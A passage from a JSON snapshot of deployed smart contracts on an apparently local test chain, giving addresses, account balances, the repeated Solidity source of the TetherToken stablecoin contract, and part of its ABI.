balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "SafeMath",\n      "address": "0x9b1f7F645351AF3631a656421eD2e40f2802E6c0",\n      "abi": [],\n      "functions": [],\n      "events": [],\n      "accounts_balances": {\n        "0x9b1f7F645351AF3631a656421eD2e40f2802E6c0": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99842250980000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 93998306520000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0x67B5656d60a809915323Bf2C40A8bEF15A152e3e",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n      